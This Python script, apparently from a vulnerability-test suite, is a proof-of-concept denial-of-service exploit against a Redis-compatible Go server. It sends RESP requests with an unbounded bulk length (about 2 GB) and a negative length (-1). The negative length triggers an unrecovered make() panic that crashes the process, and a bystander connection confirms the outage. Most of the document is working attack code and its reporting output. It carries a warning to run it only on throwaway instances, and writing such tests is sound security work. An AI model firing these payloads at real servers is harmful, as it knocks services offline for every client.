#!/usr/bin/env python3
"""
PoC #4: Unbounded RESP bulk-string length -> memory-exhaustion DoS / crash
---------------------------------------------------------------------------
Location: respReader.readBulk() in resp.go. The `$<len>` prefix is parsed
straight into an int and used to size an allocation (make([]byte, n)) BEFORE a
single payload byte is read, with no upper bound and no negative guard. Real
Redis rejects any bulk length above proto-max-bulk-len (512MB by default) with
`-ERR Protocol error: invalid bulk length` immediately.

CONFIRMATION IS BY LIVENESS, NOT BY THE ATTACK CONNECTION'S OWN FATE. A hung or
silent attack connection only proves that ONE request suffered; it does NOT
prove denial of service. So this PoC keeps a SEPARATE, ordinary "bystander"
connection open the whole time and judges success solely by whether that
bystander is denied service.

The unbounded parser has two independent failure modes at the same sink; the
PoC walks both, but only the second one actually denies the bystander:

  1. Oversized-but-positive (missing cap). We declare a bulk length far above
     the 512MB real-Redis cap and send no payload. A hardened server rejects it
     instantly ("invalid bulk length"); this one accepts the number at face
     value, allocates make([]byte, n) up front, and blocks awaiting bytes that
     never arrive. That is a real bug (repeat it and the up-front allocations
     exhaust memory) but on its own it costs the ATTACKER one hung connection —
     the bystander keeps getting served. We show exactly that: after the
     oversized probe, the bystander still answers PING. Attacker's own request
     hurting is NOT a DoS.

  2. Negative length (no negative guard) — the real service-wide DoS. We
     declare a bulk length of -1. Go's make([]byte, -1) panics, and nothing in
     the connection path calls recover(), so the panic unwinds the whole
     process (see the makeslice stack in the server log at resp.go). KVS is run
     as the container's foreground process with NO restart policy (Dockerfile
     CMD ["./kvs"]; the vuln_tests compose sets no `restart:`), so the crash is
     a permanent outage. We confirm by liveness: the pre-existing bystander
     connection dies AND fresh connects are refused. Only then is it a DoS.

If the bystander keeps answering after the negative length, the parser was
guarded and this prints "not a full DoS" and exits non-zero.

WARNING: this genuinely crashes the target. Run it against a throwaway instance.

Run: python3 04_bulklen_overflow_dos.py [host] [port]
"""
import os
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
# If a harness has configured real auth (fixing vuln #1), the bystander's
# PINGs still work without AUTH (PING is allowed pre-auth), and the oversized/
# negative cases both fire during request PARSING, before the auth gate is ever
# consulted -- so this PoC stays provable regardless of #1's fix state.
REQUIREPASS = os.environ.get("KVS_REQUIREPASS", "")

# 2,000,000,000 bytes (~1.9 GB) — far above the 512MB proto-max-bulk-len that
# real Redis enforces.
HUGE = 2_000_000_000


def encode(*parts):
    out = b"*%d\r\n" % len(parts)
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        out += b"$%d\r\n%s\r\n" % (len(p), p)
    return out


def recv_reply(s, timeout=3):
    s.settimeout(timeout)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b""
    except OSError:
        return b""


def open_bystander():
    """Open an ordinary client connection and confirm it is healthy (PING ->
    PONG). Returns the live socket, or None if the server isn't answering."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
    except OSError:
        return None
    if REQUIREPASS:
        s.sendall(encode("AUTH", REQUIREPASS))
        recv_reply(s)
    s.sendall(encode("PING"))
    if b"PONG" not in recv_reply(s):
        try:
            s.close()
        except OSError:
            pass
        return None
    return s


def bystander_alive(s):
    """True iff the already-open bystander connection still answers PING."""
    if s is None:
        return False
    try:
        s.sendall(encode("PING"))
    except OSError:
        return False
    return b"PONG" in recv_reply(s, timeout=2)


def fresh_connect_ok():
    """True iff a brand-new connection to the server succeeds (server is up)."""
    try:
        c = socket.create_connection((HOST, PORT), timeout=3)
        c.close()
        return True
    except OSError:
        return False


def oversized_probe():
    """Declare an over-cap bulk length with no payload on a throwaway
    connection; return the server's response (empty == accepted, no cap)."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError:
        return None
    s.sendall(b"*2\r\n$4\r\nECHO\r\n")
    s.sendall(b"$%d\r\n" % HUGE)
    s.sendall(b"AAAA")  # nudge bytes so a capped parser has every chance to reject
    resp = recv_reply(s, timeout=3)
    # Leave the socket open/abandoned; the server has already sized its buffer.
    return resp


def fire_negative_length():
    """Send a bulk length of -1 on a throwaway connection to trip make()'s
    panic. We do NOT judge success from this connection's own fate."""
    try:
        a = socket.create_connection((HOST, PORT), timeout=5)
        a.sendall(b"*2\r\n$4\r\nECHO\r\n$-1\r\n")
        recv_reply(a, timeout=2)
        a.close()
    except OSError:
        pass  # a refused/reset here is itself consistent with the crash


def main():
    # 0) Baseline: a separate ordinary client must be healthy before we can
    #    claim we denied it service.
    bystander = open_bystander()
    if bystander is None:
        print("[!] Pre-check: bystander PING did not get PONG; is KVS running? "
              "Cannot run a DoS test against an already-down service.")
        return 2
    print("[*] Baseline: a separate bystander connection answers PING -> PONG")

    # 1) Missing-cap facet (informational): oversized length, no payload.
    resp = oversized_probe()
    print(f"[*] Declared bulk length {HUGE} (> 512MB real-Redis cap), sent no payload")
    print(f"[*]   attack conn response within 3s: {resp!r}")
    if resp and (b"invalid bulk length" in resp or b"Protocol error" in resp):
        print("[-]   server rejected the over-cap length — bulk length is bounded here")
    elif resp == b"":
        print("[*]   no rejection: server accepted a ~1.9GB length and blocked on its own")
        print("[*]   up-front allocation. That is the missing cap, but it only hung the")
        print("[*]   ATTACKER's connection — proving it is NOT a DoS by itself:")
    else:
        print(f"[*]   unexpected response: {resp!r}")

    # The teaching point: the attacker's own request suffered, yet the bystander
    # is STILL served. A slow/silent attack connection is not denial of service.
    if bystander_alive(bystander):
        print("[*]   bystander STILL answers PING after the oversized probe "
              "(one hung attacker conn != DoS)")
    else:
        # Unexpected: only a repeated memory-exhaustion campaign should do this.
        print("[!]   bystander stopped answering after the oversized probe "
              "(unexpected for a single allocation)")

    # 2) The real service-wide DoS: negative length crashes the whole process.
    print("[*] Firing a NEGATIVE bulk length (-1) on a throwaway connection "
          "(no negative guard -> make() panics)")
    fire_negative_length()
    time.sleep(0.5)

    # 3) Liveness verdict: is the SERVICE denied, not just one request? The
    #    pre-existing bystander must be gone AND fresh connects refused. With no
    #    restart policy, connection-refused means the process has exited.
    still_up = bystander_alive(bystander) or fresh_connect_ok()
    try:
        bystander.close()
    except OSError:
        pass

    if still_up:
        print("[-] Bystander still served after the negative length — the parser "
              "survived (a negative guard is present). NOT a full DoS.")
        return 1

    print("[+] DoS confirmed by liveness: after a single -1 bulk length the "
          "bystander connection is dead AND fresh connects are refused. The "
          "unrecovered make([]byte,-1) panic took down the ENTIRE process (no "
          "restart policy), denying every client — not just the attacker's own "
          "connection.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
